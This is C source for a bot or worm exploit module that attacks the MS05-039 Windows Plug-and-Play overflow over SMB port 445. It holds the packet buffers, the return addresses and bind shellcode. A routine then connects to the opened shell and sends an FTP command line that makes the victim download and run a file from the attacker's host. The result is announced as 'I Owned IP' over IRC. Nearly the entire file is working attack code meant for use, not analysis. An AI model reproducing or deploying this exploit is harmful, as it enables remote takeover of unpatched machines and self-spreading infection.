/* Ported & modded by DiablO
 * 
 * Comments : houseofdabus shellcode was a litle fucked up so ive used mine.
 *
 * Copyright (c) 2005 houseofdabus.
 *
 * (MS05-039) Microsoft Windows Plug-and-Play Service Remote Overflow
 *
 *
 * ---------------------------------------------------------------------
 * Systems Affected:
 *    - Windows Server 2003, SP1
 *    - Windows XP SP1, SP2
 *    - Windows 2000 SP4
 *
 * ---------------------------------------------------------------------
 * Example:
 *
 * C:\>pnp445 127.0.0.2
 *
 * C:\>nc 127.0.0.2 9999
 *
 * Microsoft Windows XP [version 5.1.2600]
 * (C) Copyright 1985-2001 Microsoft Corp.
 *
 * C:\WINNT\system32>
 *
 * ---------------------------------------------------------------------
 */


#include "includes.h"
#include "functions.h"
#include "externs.h"

char SMB_Negotiate[] =
	"\x00\x00\x00\x85\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x18\x53\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
	"\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F"
	"\x52\x4B\x20\x50\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02"
	"\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00\x02\x57\x69\x6E\x64\x6F"
	"\x77\x73\x20\x66\x6F\x72\x20\x57\x6F\x72\x6B\x67\x72\x6F\x75\x70"
	"\x73\x20\x33\x2E\x31\x61\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30"
	"\x32\x00\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00\x02\x4E\x54"
	"\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00";


char SMB_SessionSetupAndX[] =
	"\x00\x00\x00\xA4\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
	"\x00\x00\x10\x00\x0C\xFF\x00\xA4\x00\x04\x11\x0A\x00\x00\x00\x00"
	"\x00\x00\x00\x20\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x69\x00\x4E"
	"\x54\x4C\x4D\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82\x08\xE0\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00"
	"\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00"
	"\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00"
	"\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00"
	"\x2E\x00\x30\x00\x00\x00\x00\x00";


char SMB_SessionSetupAndX2[] =
	"\x00\x00\x00\xDA\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
	"\x00\x08\x20\x00\x0C\xFF\x00\xDA\x00\x04\x11\x0A\x00\x00\x00\x00"
	"\x00\x00\x00\x57\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x9F\x00\x4E"
	"\x54\x4C\x4D\x53\x53\x50\x00\x03\x00\x00\x00\x01\x00\x01\x00\x46"
	"\x00\x00\x00\x00\x00\x00\x00\x47\x00\x00\x00\x00\x00\x00\x00\x40"
	"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x06\x00\x06\x00\x40"
	"\x00\x00\x00\x10\x00\x10\x00\x47\x00\x00\x00\x15\x8A\x88\xE0\x48"
	"\x00\x4F\x00\x44\x00\x00\xED\x41\x2C\x27\x86\x26\xD2\x59\xA0\xB3"
	"\x5E\xAA\x00\x88\x6F\xC5\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00"
	"\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00"
	"\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00"
	"\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00"
	"\x30\x00\x20\x00\x35\x00\x2E\x00\x30\x00\x00\x00\x00\x00";


char SMB_TreeConnectAndX[] =
	"\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
	"\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2F\x00\x00";



char SMB_TreeConnectAndX_[] =
	"\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";


/* browser */
char SMB_PipeRequest_browser[] =
	"\x00\x00\x00\x66\xFF\x53\x4D\x42\xA2\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x78\x04"
	"\x00\x08\x40\x00\x18\xFF\x00\xDE\xDE\x00\x10\x00\x16\x00\x00\x00"
	"\x00\x00\x00\x00\x9F\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x40\x00\x00\x00"
	"\x02\x00\x00\x00\x03\x13\x00\x00\x5C\x00\x62\x00\x72\x00\x6F\x00"
	"\x77\x00\x73\x00\x65\x00\x72\x00\x00\x00";


char SMB_PNPEndpoint[] =
/* 8d9f4e40-a03d-11ce-8f69-08003e30051b v1.0: pnp */
	"\x00\x00\x00\x9C\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x78\x04"
	"\x00\x08\x50\x00\x10\x00\x00\x48\x00\x00\x00\x00\x10\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x48\x00\x54\x00\x02"
	"\x00\x26\x00\x00\x40\x59\x00\x00\x5C\x00\x50\x00\x49\x00\x50\x00"
	"\x45\x00\x5C\x00\x00\x00\x40\x00\x05\x00\x0B\x03\x10\x00\x00\x00"
	"\x48\x00\x00\x00\x01\x00\x00\x00\xB8\x10\xB8\x10\x00\x00\x00\x00"
	"\x01\x00\x00\x00\x00\x00\x01\x00\x40\x4E\x9F\x8D\x3D\xA0\xCE\x11"
	"\x8F\x69\x08\x00\x3E\x30\x05\x1B\x01\x00\x00\x00\x04\x5D\x88\x8A"
	"\xEB\x1C\xC9\x11\x9F\xE8\x08\x00\x2B\x10\x48\x60\x02\x00\x00\x00";



char RPC_call[] =
	"\x00\x00\x08\x90\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x78\x04"
	"\x00\x08\x60\x00\x10\x00\x00\x3C\x08\x00\x00\x00\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x3C\x08\x54\x00\x02"
	"\x00\x26\x00\x00\x40\x4D\x08\x00\x5C\x00\x50\x00\x49\x00\x50\x00"
	"\x45\x00\x5C\x00\x00\x00\x40\x00\x05\x00\x00\x03\x10\x00\x00\x00"
	"\x3C\x08\x00\x00\x01\x00\x00\x00\x24\x08\x00\x00\x00\x00\x36\x00"
	"\x11\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x52\x00\x4F\x00"
	"\x4F\x00\x54\x00\x5C\x00\x53\x00\x59\x00\x53\x00\x54\x00\x45\x00"
	"\x4D\x00\x5C\x00\x30\x00\x30\x00\x30\x00\x30\x00\x00\x00\x00\x00"
	"\xFF\xFF\x00\x00\xE0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\xC0\x07\x00\x00\x00\x00\x00\x00\x90\x90\x90\x90\x90\x90\x90\x90"
	"\xEB\x08\x90\x90\x67\x15\x7a\x76\xEB\x08\x90\x90\x67\x15\x7a\x76"
	"\xEB\x08\x90\x90\x67\x15\x7a\x76\xEB\x08\x90\x90\x67\x15\x7a\x76"
	"\xEB\x08\x90\x90\x67\x15\x7a\x76\xEB\x08\x90\x90\x67\x15\x7a\x76"
	"\xEB\x08\x90\x90\x67\x15\x7a\x76\xEB\x08\x90\x90\x67\x15\x7a\x76"

	/* jmp over - entry point */
	"\xEB\x08\x90\x90"

	/* pop reg; pop reg; retn; - umpnpmgr.dll */
	"\x67\x15\x7a\x76" /* 0x767a1567 */

	/* jmp ebx - umpnpmgr.dll
	"\x6f\x36\x7a\x76" */

	"\xEB\x08\x90\x90\x67\x15\x7a\x76"
	"\x90\x90\x90\x90\x90\x90\x90\xEB\x08\x90\x90\x48\x4F\x44\x88\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";


char RPC_call_end[] =
	"\xE0\x07\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00";

//bindshell by DiablO port:9999
char bind_shellcode[]=
"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x02"
"\xeb\x6f\x15\x83\xeb\xfc\xe2\xf4\xfe\x81\x84\x58\xea\x12\x90\xea"
"\xfd\x8b\xe4\x79\x26\xcf\xe4\x50\x3e\x60\x13\x10\x7a\xea\x80\x9e"
"\x4d\xf3\xe4\x4a\x22\xea\x84\x5c\x89\xdf\xe4\x14\xec\xda\xaf\x8c"
"\xae\x6f\xaf\x61\x05\x2a\xa5\x18\x03\x29\x84\xe1\x39\xbf\x4b\x3d"
"\x77\x0e\xe4\x4a\x26\xea\x84\x73\x89\xe7\x24\x9e\x5d\xf7\x6e\xfe"
"\x01\xc7\xe4\x9c\x6e\xcf\x73\x74\xc1\xda\xb4\x71\x89\xa8\x5f\x9e"
"\x42\xe7\xe4\x65\x1e\x46\xe4\x55\x0a\xb5\x07\x9b\x4c\xe5\x83\x45"
"\xfd\x3d\x09\x46\x64\x83\x5c\x27\x6a\x9c\x1c\x27\x5d\xbf\x90\xc5"
"\x6a\x20\x82\xe9\x39\xbb\x90\xc3\x5d\x62\x8a\x73\x83\x06\x67\x17"
"\x57\x81\x6d\xea\xd2\x83\xb6\x1c\xf7\x46\x38\xea\xd4\xb8\x3c\x46"
"\x51\xb8\x2c\x46\x41\xb8\x90\xc5\x64\x83\x4d\xad\x64\xb8\xe6\xf4"
"\x97\x83\xcb\x0f\x72\x2c\x38\xea\xd4\x81\x7f\x44\x57\x14\xbf\x7d"
"\xa6\x46\x41\xfc\x55\x14\xb9\x46\x57\x14\xbf\x7d\xe7\xa2\xe9\x5c"
"\x55\x14\xb9\x45\x56\xbf\x3a\xea\xd2\x78\x07\xf2\x7b\x2d\x16\x42"
"\xfd\x3d\x3a\xea\xd2\x8d\x05\x71\x64\x83\x0c\x78\x8b\x0e\x05\x45"
"\x5b\xc2\xa3\x9c\xe5\x81\x2b\x9c\xe0\xda\xaf\xe6\xa8\x15\x2d\x38"
"\xfc\xa9\x43\x86\x8f\x91\x57\xbe\xa9\x40\x07\x67\xfc\x58\x79\xea"
"\x77\xaf\x90\xc3\x59\xbc\x3d\x44\x53\xba\x05\x14\x53\xba\x3a\x44"
"\xfd\x3b\x07\xb8\xdb\xee\xa1\x46\xfd\x3d\x05\xea\xfd\xdc\x90\xc5"
"\x89\xbc\x93\x96\xc6\x8f\x90\xc3\x50\x14\xbf\x7d\xed\x25\x8f\x75"
"\x51\x14\xb9\xea\xd2\xeb\x6f\x15";


void
convert_name(char *out, char *name)
{
	unsigned long len;

	len = strlen(name);
	out += len * 2 - 1;
	while (len--) {
		*out-- = '\x00';
		*out-- = name[len];
	}
}


bool ConnectShell444(EXINFO exinfo) {


		int len;
		char recvbuf[1024];
		SOCKET sockfd;
		SOCKADDR_IN shell_addr;
		memset(&shell_addr, 0, sizeof(shell_addr));
		

		shell_addr.sin_family = AF_INET;
		shell_addr.sin_addr.s_addr = finet_addr(exinfo.ip); // = *((LPIN_ADDR) * lpHostEntry->h_addr_list);
		shell_addr.sin_port = fhtons(8888);

		if ((sockfd = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET )
			return false;
		if (fconnect(sockfd, (LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
			return false;
		
		char mkdir_buff[400];

		len = frecv(sockfd, recvbuf, 1024, 0);

		_snprintf(mkdir_buff, sizeof (mkdir_buff),
		"echo open %s %d > o&echo user 1 1 >> o &echo get %s >> o &echo quit >> o &ftp -n -s:o &%s\r\n",
		GetIP(exinfo.sock),FTP_PORT,filename,filename);	

		if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
			return false;
		
		Sleep(500);

		_snprintf(mkdir_buff, sizeof (mkdir_buff), "%s\r\n", filename);


		if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
			return false;
		len = frecv(sockfd, recvbuf, 1024, 0);

		fclosesocket(sockfd);
		return true;

}


BOOL pnp445(EXINFO exinfo)
{
	struct sockaddr_in addr;
	struct hostent *he;
	int len;
	int sockfd;
	unsigned short smblen;
	char tmp[1024];
	char packet[4096];
	char *ptr;
	char recvbuf[4096];
	char buffer[ IRCLINE ];

	WSADATA wsa;
	WSAStartup(MAKEWORD(2,0), &wsa);

	if ((he = gethostbyname(exinfo.ip)) == NULL) {
		return false;
	}


	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		return false;
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(445);
	addr.sin_addr = *((struct in_addr *)he->h_addr);
	memset(&(addr.sin_zero), '\0', 8);


	if (connect(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr)) < 0) {
		return false;
	}

	if (send(sockfd, SMB_Negotiate, sizeof(SMB_Negotiate)-1, 0) < 0) {
		return false;
	}

	len = recv(sockfd, recvbuf, 4096, 0);
	if ((len <= 10) || (recvbuf[9] != 0)) {
		return false;
	}

	if (send(sockfd, SMB_SessionSetupAndX, sizeof(SMB_SessionSetupAndX)-1, 0) < 0) {
		return false;
	}

	len = recv(sockfd, recvbuf, 4096, 0);
	if (len <= 10) {
		return false;;
	}

	if (send(sockfd, SMB_SessionSetupAndX2, sizeof(SMB_SessionSetupAndX2)-1, 0) < 0) {
		return false;
	}

	len = recv(sockfd, recvbuf, 4096, 0);
	if ((len <= 10) || (recvbuf[9] != 0)) {
		return false;
	}

	ptr = packet;
	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX)-1);
	ptr += sizeof(SMB_TreeConnectAndX)-1;

	sprintf(tmp, "\\\\%s\\IPC$", exinfo.ip);
	convert_name(ptr, tmp);
	smblen = strlen(tmp)*2;
	ptr += smblen;
	smblen += 9;
	memcpy(packet + sizeof(SMB_TreeConnectAndX)-1-3, &smblen, 1);

	memcpy(ptr, SMB_TreeConnectAndX_, sizeof(SMB_TreeConnectAndX_)-1);
	ptr += sizeof(SMB_TreeConnectAndX_)-1;

	smblen = ptr-packet;
	smblen -= 4;
	memcpy(packet+3, &smblen, 1);

	if (send(sockfd, packet, ptr-packet, 0) < 0) {
		return false;
	}

	len = recv(sockfd, recvbuf, 4096, 0);
	if ((len <= 10) || (recvbuf[9] != 0)) {
		return false;
	}

	if (send(sockfd, SMB_PipeRequest_browser, sizeof(SMB_PipeRequest_browser)-1, 0) < 0) {
		return false;
	}

	len = recv(sockfd, recvbuf, 4096, 0);
	if ((len <= 10) || (recvbuf[9] != 0)) {
		return false;
	}

	if (send(sockfd, SMB_PNPEndpoint, sizeof(SMB_PNPEndpoint)-1, 0) < 0) {
		return false;
	}

	len = recv(sockfd, recvbuf, 4096, 0);
	if ((len <= 10) || (recvbuf[9] != 0)) {
		return false;
	}



	// nop
	ptr = packet;
	memset(packet, '\x90', sizeof(packet));

	// header & offsets
	memcpy(ptr, RPC_call, sizeof(RPC_call)-1);
	ptr += sizeof(RPC_call)-1;

	// shellcode
	memcpy(ptr, bind_shellcode, sizeof(bind_shellcode)-1);

	// end of packet
	memcpy( packet + 2196 - sizeof(RPC_call_end)-1 + 2,
		RPC_call_end,
		sizeof(RPC_call_end)-1);

	// sending...
	if (send(sockfd, packet, 2196, 0) < 0) {
		return false;
	}

	recv(sockfd, recvbuf, 4096, 0);


	closesocket(sockfd);

	Sleep(300);

	if (ConnectShell444(exinfo) != false) {
		_snprintf( buffer, sizeof(buffer), "[%s]: I Owned IP: %s.", exploit[ exinfo.exploit ].name, exinfo.ip );
		irc_privmsg( exinfo.sock, exinfo.chan, buffer, exinfo.notice );
		addlog( buffer );
		exploit[ exinfo.exploit ].stats++;
	}

	return true;

}